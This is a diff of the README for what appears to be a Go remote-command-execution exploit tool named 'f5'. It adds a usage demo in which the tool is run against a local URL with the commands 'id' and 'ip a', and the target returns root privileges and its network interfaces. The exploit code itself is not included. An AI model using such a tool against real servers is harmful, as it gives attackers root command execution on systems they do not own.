@@ -39,5 +39,24 @@ go build
 ```
 
 ### 运 行 效 果
-![](.\img\rce.png)
 
+![](.\img\rce.png)
+```
+[root@localhost f5]# ./f5 -url http://127.0.0.1:8083 -cmd "id"
+uid=0(root) gid=0(root) groups=0(root)
+
+[root@localhost f5]# ./f5 -url http://127.0.0.1:8083 -cmd "ip a"
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: em1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 6c:2b:59:8b:92:aa brd ff:ff:ff:ff:ff:ff
+    inet xx.xx.xx.xx/24 brd xx.xx.xx.xx scope global noprefixroute em1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::8dec:ff23:2a42:3517/64 scope link noprefixroute
+       valid_lft forever preferred_lft forever
+
+```
